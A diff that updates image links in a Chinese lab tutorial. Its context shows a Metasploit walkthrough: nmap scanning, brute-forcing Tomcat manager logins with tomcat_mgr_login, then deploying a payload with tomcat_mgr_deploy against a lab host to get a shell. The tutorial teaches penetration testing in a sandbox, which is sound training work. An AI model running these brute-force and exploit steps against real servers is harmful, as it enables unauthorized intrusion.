@@ -37,18 +37,18 @@
 首先使用 `virsh list` 命令查看当前环境中虚拟机的列表和状态，注意需要使用 sudo，另外需要加上参数 `--all` 才会显示所有关机状态的虚拟机：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890445878.png-wm)
+![图片描述](../imgs/1479890445878.png-wm_6.png)
 
 然后我们使用 `virsh start` 命令启动虚拟机，再次查看状态虚拟机已经进入 running 状态：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890565816.png-wm)
+![图片描述](../imgs/1479890565816.png-wm_6.png)
 
 注意由于虚拟机启动需要时间，大概要等四分钟左右我们就可以使用 SSH 访问两台虚拟机了。
 
 首先使用 SSH 连接到 Kali，我们大部分的攻击操作都需要在 Kali 虚拟机中进行，注意用户名root，密码 toor 是不显示的，使用命令 `ssh root@kali` 即可，因为当前实验环境中已经把 IP 地址和主机名的对应写入到了 `/etc/hosts` 文件中，避免输入不好记的 IP 地址：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890676283.png-wm)
+![图片描述](../imgs/1479890676283.png-wm_6.png)
 
 现在两台实验环境都已经启动，我们即将进行对目标主机进行渗透测试。
 
@@ -68,7 +68,7 @@ sudo msfconsole
 nmap -sV -T5 target
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480470707037.png-wm)
+![图片描述](../imgs/1480470707037.png-wm.png)
 
 其中， `-T` 是扫描的速度设置:
 
@@ -102,7 +102,7 @@ nmap -sV -T5 target
 search tomcat
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480471561538.png-wm)
+![图片描述](../imgs/1480471561538.png-wm.png)
 
 使用 use 命令，选择相应的模块：
 
@@ -112,7 +112,7 @@ use auxiliary/scanner/http/tomcat_mgr_login
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480471975188.png-wm)
+![图片描述](../imgs/1480471975188.png-wm.png)
 
 接着查看所要设定的必要参数，并用 set 命令，设置索要设置的参数：
 
@@ -127,7 +127,7 @@ set RHOSTS 192.168.122.102
 set RPORT 8180
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480472334896.png-wm)
+![图片描述](../imgs/1480472334896.png-wm.png)
 
 
 接着使用命令，进行攻击，暴力破解，跑出密码：
@@ -138,7 +138,7 @@ exploit
 ```
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480472456820.png-wm)
+![图片描述](../imgs/1480472456820.png-wm.png)
 
 
 由图可以看出，前面符号为绿色的 + 号的，即为可用的成密码。
@@ -267,7 +267,7 @@ back
 search tomcat
 
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480472752260.png-wm)
+![图片描述](../imgs/1480472752260.png-wm.png)
 
 接着选择相应的攻击模块，使用命令如下：
 
@@ -276,7 +276,7 @@ search tomcat
 use exploit/multi/http/tomcat_mgr_deploy
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480472827813.png-wm)
+![图片描述](../imgs/1480472827813.png-wm.png)
 
 
 再由 show 命令查看相应所需填写参数，并设置，这里告诉大家一个清屏的小技巧 `ctrl` + `l`，即为清屏： 
@@ -298,7 +298,7 @@ set httpusername tomcat
 set httppassword tomcat
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480474272591.png-wm)
+![图片描述](../imgs/1480474272591.png-wm.png)
 
 
 接着进行攻击，这个地方，`大概需要等一分钟左右`：
@@ -309,7 +309,7 @@ exploit
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480476512846.png-wm)
+![图片描述](../imgs/1480476512846.png-wm.png)
 
 
 好了，已经渗透入了对方的目标主机，下面我们将进行验证渗透是否成功
@@ -328,7 +328,7 @@ sysinfo
 不要输入 `whoami` ，否则会报错，如图所示，显示的操作系统信息：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480476846067.png-wm)
+![图片描述](../imgs/1480476846067.png-wm.png)
 
 
 ## 五、总结
